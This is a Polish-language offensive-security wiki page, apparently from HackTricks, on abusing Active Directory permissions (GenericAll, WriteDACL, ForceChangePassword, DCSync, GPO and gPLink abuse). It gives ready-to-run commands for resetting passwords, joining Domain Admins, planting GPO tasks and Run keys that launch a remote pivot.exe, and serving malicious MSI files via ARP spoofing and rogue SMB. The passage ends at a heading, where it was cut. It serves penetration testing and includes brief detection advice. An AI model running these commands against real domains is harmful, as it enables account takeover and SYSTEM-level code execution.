# Nadużywanie ACL/ACE w Active Directory

{{#include ../../../banners/hacktricks-training.md}}

**Ta strona zawiera głównie podsumowanie technik opisanych w** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **oraz** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Więcej szczegółów znajdziesz w oryginalnych artykułach.**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

Informacje o nadużywaniu ACL usuniętych obiektów i przywracaniu kont znajdziesz w sekcji [Przywracanie konta z kosza AD](../privileged-groups-and-token-privileges.md#reanimating-a-deleted-account-through-delegated-acls).

## **Uprawnienia GenericAll do użytkownika**

To uprawnienie zapewnia atakującemu pełną kontrolę nad docelowym kontem użytkownika. Po potwierdzeniu uprawnień `GenericAll` za pomocą polecenia `Get-ObjectAcl` atakujący może:

- **Zmienić hasło użytkownika docelowego**: za pomocą `net user <username> <password> /domain` atakujący może zresetować hasło użytkownika.
- W systemie Linux można zrobić to samo przez SAMR, używając Samba `net rpc`:<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

- **Jeśli konto jest wyłączone, usuń flagę UAC**: `GenericAll` umożliwia edycję `userAccountControl`. Z Linuksa BloodyAD może usunąć flagę `ACCOUNTDISABLE`:<sup>[[8]](#references)[[10]](#references)</sup>

```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```

- **Targeted Kerberoasting**: Przypisz SPN do konta użytkownika, aby można było przeprowadzić na nim kerberoasting, a następnie użyj Rubeus i targetedKerberoast.py, aby wyodrębnić hashe ticket-granting ticket (TGT) i spróbować je złamać.

```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```

- **Targeted ASREPRoasting**: Wyłącz pre-authentication użytkownika, narażając jego konto na ASREPRoasting.

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- **Shadow Credentials / Key Credential Link**: Mając uprawnienie `GenericAll` do konta użytkownika, możesz dodać poświadczenie oparte na certyfikacie i uwierzytelnić się jako ten użytkownik bez zmiany jego hasła. Zobacz:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **Uprawnienia GenericAll do grupy**

To uprawnienie pozwala atakującemu manipulować członkostwem w grupie, jeśli ma uprawnienia `GenericAll` do grupy, takiej jak `Domain Admins`. Po ustaleniu nazwy wyróżniającej grupy za pomocą `Get-NetGroup` atakujący może:

- **Dodać siebie do grupy Domain Admins**: Można to zrobić za pomocą bezpośrednich poleceń lub modułów takich jak Active Directory albo PowerSploit.

```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```

- Z Linuksa możesz również użyć BloodyAD, aby dodać się do dowolnych grup, jeśli masz uprawnienia GenericAll/Write do zarządzania ich członkostwem. Jeśli grupa docelowa jest zagnieżdżona w „Remote Management Users”, natychmiast uzyskasz dostęp przez WinRM do hostów, które honorują tę grupę:<sup>[[8]](#references)</sup>

```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```

## **GenericAll / GenericWrite / Write on Computer/User**

Posiadanie tych uprawnień do obiektu komputera lub konta użytkownika umożliwia:

- **Kerberos Resource-based Constrained Delegation**: Umożliwia przejęcie obiektu komputera.
- **Shadow Credentials**: Użyj tej techniki, aby podszyć się pod konto komputera lub użytkownika, wykorzystując uprawnienia do utworzenia shadow credentials.

## Przenoszenie obiektu do OU z dziedziczonymi uprawnieniami

Ścieżka ataku może łączyć **uprawnienia do przenoszenia konta** z **uprawnieniami do zapisu dziedziczonymi z docelowej OU**, nawet jeśli żaden z podmiotów nie może początkowo modyfikować poufnych atrybutów konta. Sprawdź uprawnienia źródłowego obiektu do przenoszenia oraz `CreateChild` w docelowej OU, przenieś obiekt, a następnie ponownie sprawdź jego efektywną DACL. Na przykład `Set-DomainObjectDN -Identity <user> -DestinationDN 'OU=<destination>,DC=<domain>,DC=<tld>'` w powerview.py przenosi użytkownika; kontrolowana grupa, która dziedziczy `GenericWrite` w tej OU, może następnie dodać [shadow credential](shadow-credentials.md). Samo przeniesienie nie tworzy dziedziczonego uprawnienia.<sup>[[18]](#references)</sup>

Jeśli masz `GenericAll` do OU, ale nie masz odpowiedniego dziedziczonego ACE, polecenie `bloodyAD --host <dc> -d <domain> -k add genericAll 'OU=<destination>,DC=<domain>,DC=<tld>' <controlled-user>` może dodać taki ACE dla jej obiektów potomnych. Sprawdź konto docelowe osobno: **dla kont chronionych przez AdminSDHolder dziedziczenie jest wyłączone**, więc ACE w OU może działać na zwykłych użytkowników, ale nie na chronionego użytkownika. Zobacz [AdminSDHolder i SDProp](../privileged-groups-and-token-privileges.md#adminsdholder-group).<sup>[[18]](#references)</sup>

Istnieje też odrębna ścieżka nadużycia, gdy uprzywilejowany skrypt zaplanowanego czyszczenia wybiera OU na podstawie ACE kontrolowanych przez atakującego, a następnie wykonuje na ich obiektach potomnych `Set-ADObject -Clear adminCount` **oraz** `$acl.SetAccessRuleProtection($False, $False)`. Jeśli możesz modyfikować DACL OU, przyznaj grupie sprawdzanej przez skrypt wymagany ACE `ExtendedRight` lub `GenericAll`; osobno sprawdź, czy możesz uruchomić zadanie. Uprzywilejowane zadanie może wtedy ponownie włączyć dziedziczenie dla wcześniej chronionego konta, umożliwiając zastosowanie ACE z OU. Potwierdź dokładny skrypt, uprawnienia do uruchomienia zadania oraz wynikową DACL; samo wyczyszczenie `adminCount` nie włącza ponownie dziedziczenia, a SDProp może ponownie objąć ochroną konta, które nadal należą do chronionych grup.<sup>[[18]](#references)</sup>

## **WriteProperty on Group**

Jeśli użytkownik ma uprawnienia `WriteProperty` do wszystkich obiektów w określonej grupie (np. `Domain Admins`), może:

- **Dodać siebie do grupy Domain Admins**: Można to osiągnąć przez połączenie poleceń `net user` i `Add-NetGroupUser`; metoda ta umożliwia eskalację uprawnień w domenie.

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **Self (Self-Membership) on Group**

To uprawnienie umożliwia atakującym dodanie samych siebie do określonych grup, takich jak `Domain Admins`, za pomocą poleceń bezpośrednio modyfikujących członkostwo w grupach. Poniższa sekwencja poleceń pozwala dodać samego siebie:

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **WriteProperty (Samodzielne członkostwo)**

Podobne uprawnienie pozwala atakującym bezpośrednio dodawać siebie do grup przez modyfikowanie właściwości grup, jeśli mają do nich prawo `WriteProperty`. Potwierdzenie i wykorzystanie tego uprawnienia odbywa się za pomocą:

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```

## **ForceChangePassword**

Posiadanie `ExtendedRight` do `User-Force-Change-Password` dla użytkownika umożliwia zresetowanie hasła bez znajomości aktualnego hasła. Weryfikację tego uprawnienia i jego wykorzystanie można przeprowadzić za pomocą PowerShella lub alternatywnych narzędzi wiersza poleceń. Istnieje kilka sposobów resetowania hasła użytkownika, w tym sesje interaktywne i jednolinijkowe polecenia do środowisk nieinteraktywnych. Polecenia obejmują zarówno proste wywołania PowerShella, jak i użycie `rpcclient` w systemie Linux, co pokazuje różnorodność wektorów ataku.

```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```

## **WriteOwner dla grupy**

Jeśli atakujący odkryje, że ma uprawnienia `WriteOwner` do grupy, może zmienić właściciela grupy na siebie. Jest to szczególnie istotne, gdy chodzi o grupę `Domain Admins`, ponieważ zmiana właściciela zapewnia szerszą kontrolę nad atrybutami i członkostwem grupy. Proces polega na zidentyfikowaniu właściwego obiektu za pomocą `Get-ObjectAcl`, a następnie użyciu `Set-DomainObjectOwner` do zmiany właściciela, podając SID lub nazwę.

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```

## **GenericWrite dla użytkownika**

To uprawnienie pozwala atakującemu modyfikować właściwości użytkownika. W szczególności, mając dostęp `GenericWrite`, atakujący może zmienić ścieżkę skryptu logowania użytkownika, aby uruchamiać złośliwy skrypt podczas logowania. Można to zrobić za pomocą polecenia `Set-ADObject`, aktualizując właściwość `scriptpath` docelowego użytkownika tak, aby wskazywała skrypt atakującego.

```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```

Węższy ACE `WriteProperty` ograniczony do atrybutu [`scriptPath` użytkownika](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada3/c640630e-23ff-44e7-886f-16df9574039e) może wystarczyć; `GenericWrite` nie jest wymagane. Połącz to uprawnienie do atrybutu z zapisywalnym skryptem w drzewie `SYSVOL\<domain>\scripts` lub `NETLOGON` domeny, a następnie oceń, czy docelowy użytkownik prawdopodobnie się zaloguje i uruchomi skrypt. Skrypt jest uruchamiany podczas logowania w kontekście tego użytkownika. Osobno sprawdź efektywne ACL-e AD oraz plików/udziałów; pasujący ACE Allow ani sam zapisywalny katalog nie potwierdzają istnienia kompletnej ścieżki.

## **GenericWrite w grupie**

Dzięki temu uprawnieniu atakujący mogą manipulować członkostwem w grupie, na przykład dodając do konkretnych grup siebie lub innych użytkowników. Proces ten obejmuje utworzenie obiektu poświadczeń, użycie go do dodawania lub usuwania użytkowników z grupy oraz weryfikację zmian członkostwa za pomocą poleceń PowerShell.

```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```

- Z Linuksa Samba `net` może dodawać/usuwać członków, gdy masz uprawnienie `GenericWrite` do grupy (przydatne, gdy PowerShell/RSAT są niedostępne):<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

## **WriteDACL + WriteOwner**

Posiadanie obiektu AD i uprawnień `WriteDACL` do niego pozwala atakującemu nadać sobie uprawnienia `GenericAll` do tego obiektu. Można to osiągnąć przez manipulację ADSI, uzyskując pełną kontrolę nad obiektem i możliwość modyfikowania członkostwa w jego grupach. Mimo to podczas próby wykorzystania tych uprawnień za pomocą poleceń cmdlet `Set-Acl` / `Get-Acl` z modułu Active Directory występują pewne ograniczenia.<sup>[[4]](#references)[[7]](#references)</sup>

```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```

### Szybkie przejęcie WriteDACL/WriteOwner (PowerView)

Gdy masz uprawnienia `WriteOwner` i `WriteDacl` do konta użytkownika lub konta usługi, możesz przejąć nad nim pełną kontrolę i zresetować jego hasło za pomocą PowerView bez znajomości starego hasła:

```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```

Uwagi:
- Jeśli masz tylko `WriteOwner`, może być konieczna wcześniejsza zmiana właściciela na siebie:

```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```

- Zweryfikuj dostęp przy użyciu dowolnego protokołu (SMB/LDAP/RDP/WinRM) po zresetowaniu hasła.

## **Replikacja w domenie (DCSync)**

Atak DCSync wykorzystuje określone uprawnienia do replikacji w domenie, aby podszyć się pod kontroler domeny i zsynchronizować dane, w tym poświadczenia użytkowników. Ta zaawansowana technika wymaga uprawnień takich jak `DS-Replication-Get-Changes`, które pozwalają atakującym wyodrębniać poufne informacje ze środowiska AD bez bezpośredniego dostępu do kontrolera domeny.<sup>[[5]](#references)</sup> [**Dowiedz się więcej o ataku DCSync tutaj.**](../dcsync.md)

## Delegowanie GPO <a href="#gpo-delegation" id="gpo-delegation"></a>

### Delegowanie GPO

Delegowany dostęp do zarządzania obiektami zasad grupy (GPO) może stwarzać poważne zagrożenia dla bezpieczeństwa. Na przykład, jeśli użytkownik taki jak `offense\spotless` otrzyma delegowane uprawnienia do zarządzania GPO, może mieć uprawnienia takie jak **WriteProperty**, **WriteDacl** i **WriteOwner**. Uprawnienia te można wykorzystać do złośliwych celów. Można je zidentyfikować za pomocą PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>

### Wyliczanie uprawnień GPO

Aby zidentyfikować błędnie skonfigurowane GPO, można łączyć ze sobą polecenia cmdlet PowerSploit. Umożliwia to wykrycie GPO, którymi może zarządzać określony użytkownik: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Komputery, do których zastosowano określoną zasadę**: Można ustalić, do których komputerów ma zastosowanie określone GPO, co pomaga zrozumieć zakres potencjalnych skutków. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Zasady zastosowane do określonego komputera**: Aby sprawdzić, jakie zasady zastosowano do danego komputera, można użyć poleceń takich jak `Get-DomainGPO`.

**Jednostki organizacyjne, do których zastosowano określoną zasadę**: Jednostki organizacyjne (OU), których dotyczy dana zasada, można zidentyfikować za pomocą `Get-DomainOU`.

Do wyliczania GPO i wyszukiwania w nich problemów można również użyć narzędzia [**GPOHound**](https://github.com/cogiceo/GPOHound).

### Nadużywanie GPO — New-GPOImmediateTask

Błędnie skonfigurowane GPO można wykorzystać do wykonania kodu, na przykład przez utworzenie natychmiastowego zaplanowanego zadania. Można w ten sposób dodać użytkownika do lokalnej grupy administratorów na komputerach objętych zasadą, znacznie podnosząc jego uprawnienia:

```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```

### Moduł GroupPolicy - nadużywanie GPO

Moduł GroupPolicy, jeśli jest zainstalowany, umożliwia tworzenie i łączenie nowych obiektów GPO oraz ustawianie preferencji, takich jak wartości rejestru służące do uruchamiania backdoorów na zaatakowanych komputerach. Ta metoda wymaga zaktualizowania obiektu GPO oraz zalogowania się użytkownika na komputerze, aby doszło do wykonania:

```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```

### SharpGPOAbuse — nadużywanie GPO

SharpGPOAbuse umożliwia nadużywanie istniejących GPO poprzez dodawanie zadań lub modyfikowanie ustawień bez konieczności tworzenia nowych GPO. To narzędzie wymaga modyfikacji istniejących GPO lub użycia narzędzi RSAT do utworzenia nowych przed wprowadzeniem zmian:

```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```

### Wymuszenie aktualizacji zasad

Aktualizacje GPO zazwyczaj odbywają się co około 90 minut. Aby przyspieszyć ten proces, zwłaszcza po wprowadzeniu zmian, na komputerze docelowym można użyć polecenia `gpupdate /force`, aby natychmiast wymusić aktualizację zasad. Dzięki temu wszelkie modyfikacje GPO zostaną zastosowane bez oczekiwania na kolejny automatyczny cykl aktualizacji.

### Jak to działa

Po sprawdzeniu zaplanowanych zadań dla danego GPO, takiego jak `Misconfigured Policy`, można potwierdzić dodanie zadań, takich jak `evilTask`. Zadania te są tworzone za pomocą skryptów lub narzędzi wiersza poleceń, których celem jest modyfikacja działania systemu lub eskalacja uprawnień.

Struktura zadania przedstawiona w pliku konfiguracyjnym XML wygenerowanym przez `New-GPOImmediateTask` określa szczegóły zaplanowanego zadania, w tym polecenie do wykonania i wyzwalacze. Plik ten pokazuje, jak definiuje się i zarządza zaplanowanymi zadaniami w ramach GPO, umożliwiając wykonywanie dowolnych poleceń lub skryptów w ramach egzekwowania zasad.

### Użytkownicy i grupy

GPO umożliwiają również modyfikowanie członkostwa użytkowników i grup w systemach docelowych. Edytując bezpośrednio pliki zasad Users and Groups, atakujący mogą dodawać użytkowników do uprzywilejowanych grup, takich jak lokalna grupa `administrators`. Jest to możliwe dzięki delegowaniu uprawnień do zarządzania GPO, które pozwala modyfikować pliki zasad w celu dodawania nowych użytkowników lub zmieniania członkostwa w grupach.

Plik konfiguracyjny XML dla Users and Groups opisuje sposób wprowadzania tych zmian. Dodając wpisy do tego pliku, można przyznać określonym użytkownikom podwyższone uprawnienia we wszystkich systemach objętych zasadami. Ta metoda pozwala bezpośrednio eskalować uprawnienia poprzez manipulowanie GPO.

W przypadku ustawień zabezpieczeń, takich jak członkostwo w grupach lokalnych i uprawnienia użytkowników, sprawdź również zastosowany szablon GPO w lokalizacji `Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf` oraz listę ACL katalogu `SecEdit`. Możliwość zapisu w katalogu lub pliku jest wskazówką do dalszej weryfikacji: o tym, czy zmiana może zostać zastosowana, decydują efektywny dostęp do udziału SYSVOL, jawne odmowy i dziedziczone listy ACL, uprawnienia kontenera Group Policy, zakres zasad oraz odświeżanie po stronie klienta. Samo członkostwo w grupie o nazwie „GPO Managers” nie potwierdza uprawnień do edycji. [Microsoft opisuje ścieżkę tego szablonu oraz podział na kontener Group Policy i szablon.](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gpsb/a600273b-75fc-4ce7-a1a3-ae221e102e91)

Można również rozważyć dodatkowe metody wykonywania kodu lub utrzymywania persistence, takie jak wykorzystanie skryptów logowania/wylogowywania, modyfikowanie kluczy rejestru uruchamianych automatycznie, instalowanie oprogramowania za pomocą plików .msi lub edytowanie konfiguracji usług. Techniki te zapewniają różne sposoby utrzymywania dostępu i kontrolowania systemów docelowych poprzez nadużywanie GPO.

### Przekierowanie pobierania GPC/GPT do uwierzytelnionych nieautoryzowanych usług

GPO składa się z przechowywanego w LDAP **Group Policy Container (GPC)** zawierającego metadane oraz hostowanego przez SMB **Group Policy Template (GPT)** zawierającego pliki zasad. Podczas odświeżania klient korzysta z `gPLink` kontenera, odczytuje wskazany GPC i jego `gPCFileSysPath`, a następnie pobiera GPT ze wskazanej ścieżki UNC. W rezultacie dostęp do zapisu w samym GPC albo w `gPLink` jednostki OU, lokacji lub domeny można wykorzystać do uruchomienia przetwarzania zasad z podwyższonymi uprawnieniami.<sup>[[12]](#references)[[13]](#references)[[14]](#references)[[15]](#references)</sup>

#### Zatruwanie `gPCFileSysPath` za pomocą GPOddity

Jeśli kontrolowany podmiot może zapisywać w docelowym GPC (bezpośrednio lub przez **przekaźnik NTLM do LDAP**), należy zastąpić `gPCFileSysPath` ścieżką UNC hostowaną przez atakującego. [GPOddity](https://github.com/synacktiv/GPOddity) automatyzuje zmianę LDAP i udostępnia złośliwy GPT zawierający pliki zasad oparte na modułach lub Immediate Task, które klient Group Policy wykonuje jako `NT AUTHORITY\SYSTEM`.<sup>[[12]](#references)[[15]](#references)[[16]](#references)</sup>

Anonimowy udział SMB lub udział niewymagający określonych poświadczeń nie wystarczy we współczesnych klientach Windows: SMB Secure Negotiate wymaga potwierdzenia pomyślnego uwierzytelnienia, więc nieautoryzowana usługa musi weryfikować tożsamość domenową, wyprowadzić klucz sesji SMB i poprawnie podpisywać odpowiedzi. W trybie osadzonym skonfiguruj GPOddity przy użyciu kontrolowanego konta komputera i jego klucza usługi, a następnie wybierz ładunek po stronie komputera lub użytkownika w sekcji `[COMMANDS]`.<sup>[[15]](#references)[[16]](#references)</sup>

```ini
[SMB]
smb-mode=embedded
smb-machine=SCAPY$
smb-ip=<attacker_ip>
smb-nt=<machine_nt_hash>
smb-share=gpoddity
smb-iface=eth0
```

```bash
python3 gpoddity.py --config config.ini -v
```

**Szczególny przypadek GPO użytkownika:** po MS16-072 system Windows nadal tworzy dwie sesje SMB2 w ramach **tego samego połączenia TCP**: sesja użytkownika odczytuje `GPT.INI`, a następnie sesja konta komputera odczytuje efektywną konfigurację, taką jak `ScheduledTasks.xml`. Nieuczciwy serwer musi więc indeksować stan uwierzytelniania, klucze sesji i klucze podpisywania według SMB2 `SessionId`, a nie tylko gniazda. Fork Scapy osadzony w GPOddity/OUned obsługuje to za pomocą `SMBStreamSocketMultiplexing` i uwzględniającego multipleksowanie `SMBServer`; serwery Impacket/Scapy obsługujące pojedynczą sesję w przeciwnym razie ponownie używają niewłaściwego stanu podpisywania i nie obsługują poprawnie zasad użytkownika.<sup>[[15]](#references)</sup>

#### Zatruwanie `gPLink` za pomocą OUned

Mając `WriteGPLink`, `GenericWrite` lub równoważną kontrolę nad OU, Site albo Domain, atakujący może dodać łącze, którego DN GPC jest obsługiwany przez kontrolowany przez atakującego host LDAP. Ten prymityw został pierwotnie przedstawiony przez Petrosa Koutroumpisa; [OUned](https://github.com/synacktiv/OUned) automatyzuje zapis LDAP oraz łańcuch złośliwych GPC/GPT.<sup>[[13]](#references)[[14]](#references)[[17]](#references)</sup>

```text
[LDAP://cn={7B7D6B23-26F8-4E4B-AF23-F9B9005167F6},cn=policies,cn=system,DC=attacker,DC=corp,DC=com;0]
```

Ofiara najpierw uwierzytelnia się w nieautoryzowanej usłudze LDAP i otrzymuje GPC, którego `gPCFileSysPath` wskazuje na nieautoryzowaną usługę SMB; następnie uwierzytelnia się w SMB i stosuje dostarczony GPT. OUned potrzebuje więc konta z SPN LDAP, konta komputera z SPN HOST dla SMB (to samo konto komputera może spełniać oba wymagania) oraz rozwiązywania nazw DNS lub przekierowania zwrotnego, które kieruje porty 389 i 445 do hosta operatora.<sup>[[15]](#references)[[17]](#references)</sup>

```bash
python3 OUned.py --config config.ini -v
```

Wbudowany serwer LDAP Scapy w OUned weryfikuje Kerberos/SPNEGO przy użyciu prawdziwego klucza kontrolowanej usługi i udostępnia dowolne dane GPC z JSON. Pusty klucz JSON odwzorowuje rootDSE, prefiksy `base64:` oznaczają wartości binarne, a serwer obsługuje operacje add/delete/modify/search oraz wyszukiwania `BASE`, `LEVEL` i `SUBTREE`; może negocjować brak ochrony, integralność lub poufność. Dzięki temu usługa może być ponownie używana, gdy inny komponent Windows podąża za kontrolowanym przez atakującego odwołaniem LDAP, ale wymaga uwierzytelnionego LDAP.<sup>[[15]](#references)</sup>

Nie zakładaj, że zsynchronizowanie hasła konta z domeną testową odtworzy wszystkie klucze Kerberos: RC4 jest wyprowadzany z hasła, natomiast AES string-to-key używa także soli wyprowadzonej z nazwy hosta/domeny principalu. Przekazanie rzeczywistego klucza AES konta do `KerberosSSP` pozwala uniknąć wymuszania RC4 przez wykrywalną zmianę atrybutu `msDS-SupportedEncryptionTypes`, który konto komputera może modyfikować samo.<sup>[[15]](#references)</sup>

#### Punkty kontrolne wykrywania

Koreluj zmiany `gPCFileSysPath` lub `gPLink` ze zmianami wersji GPO i nowymi plikami XML z zadaniami Immediate/Scheduled Task. Sprawdzaj odwołania do nieoczekiwanych kontekstów nazewniczych, hosty UNC spoza zatwierdzonego zestawu DC/SYSVOL, rekordy DNS przekierowujące nazwy kont komputerów, bilety usług LDAP/CIFS dla nietypowych kont komputerów oraz zmiany `msDS-SupportedEncryptionTypes` włączające RC4.<sup>[[15]](#references)</sup>

### WriteGPLink + przejęcie ścieżki UNC (ARP spoofing)

`WriteGPLink` w obrębie OU/domeny pozwala zmodyfikować atrybut `gPLink` kontenera docelowego i **wymusić zastosowanie istniejącego GPO** bez edytowania samego GPO. Jest to interesujące, gdy połączone GPO już odwołuje się do zdalnej zawartości przez **ścieżki UNC** (`\\HOST\share\...`), ponieważ uwierzytelnieni użytkownicy mogą odczytywać **SYSVOL** i wyszukiwać w nim offline możliwe do ponownego wykorzystania zasady.<sup>[[11]](#references)</sup>

Ogólny przebieg:

1. Użyj BloodHound, aby znaleźć principal z uprawnieniem `WriteGPLink` do OU i wyliczyć komputery/użytkowników w tej OU.
2. Sklonuj `SYSVOL` tylko do odczytu i przeanalizuj GPO, szukając **Software Installation**, **mapowań dysków** (`Drives.xml`) oraz **skryptów logowania/uruchamiania**, które odwołują się do ścieżek UNC.
3. Wybieraj zasady wskazujące **bezpośrednią nazwę hosta** (na przykład `\\DC02\share\pkg.msi`) zamiast ścieżek DFS/przestrzeni nazw domeny, ponieważ ścieżki oparte na nazwie hosta łatwiej przekierować za pomocą spoofingu L2.
4. Dodaj GUID wybranego GPO do `gPLink` docelowej OU, aby ofiara przetworzyła tę istniejącą już zasadę.
5. W tej samej domenie rozgłoszeniowej przeprowadź ARP spoofing hosta UNC i lokalnie przypisz jego IP (`ip addr add <target_ip>/32 dev <iface>`), aby ruch SMB ofiary trafiał na Twój host.
6. Udostępnij oczekiwaną ścieżkę/nazwę pliku na serwerze SMB atakującego (na przykład `smbserver.py`) i poczekaj na standardowe przetworzenie zasad.

Przykład pobrania `SYSVOL` i korelacji GPO:

```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```

Połącz istniejący obiekt GPO z docelową jednostką organizacyjną (OU):

```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
  --gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```

#### Software Installation UNC hijack -> SYSTEM

Jeśli połączony GPO wdraża MSI z lokalizacji UNC, klient pobierze go podczas **uruchamiania komputera** i zainstaluje jako **`NT AUTHORITY\SYSTEM`**. Podszywając się pod wskazany host i udostępniając złośliwy plik MSI pod **tą samą nazwą udziału, ścieżką i nazwą pliku**, możesz wykorzystać `WriteGPLink` do wykonania kodu jako SYSTEM **bez modyfikowania SYSVOL**.

Ważne ograniczenia:

- **Czas ma znaczenie**: nowe łącze zostanie wykryte podczas odświeżania zasad (zwykle co ~90 minut), ale **Software Installation** zwykle uruchamia się po **ponownym uruchomieniu**.
- Windows Installer zwykle śledzi wdrożenie za pomocą **`ProductCode`** pakietu. Jeśli produkt jest już zainstalowany, wdrożenie może zostać pominięte.
- Aby uniknąć odrzucenia przez instalator, zmodyfikuj złośliwy plik MSI tak, aby jego **`ProductCode`** i **`PackageCode`** były zgodne z tymi w legalnym pakiecie oczekiwanym przez GPO.
- Stare pliki reklam `.aas` mogą nadal znajdować się w `SYSVOL`, więc przed poleganiem na wdrożeniu sprawdź, czy nadal wygląda na aktywne.

```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```

#### Drive-map UNC hijack -> przechwytywanie NTLM / WebDAV relay

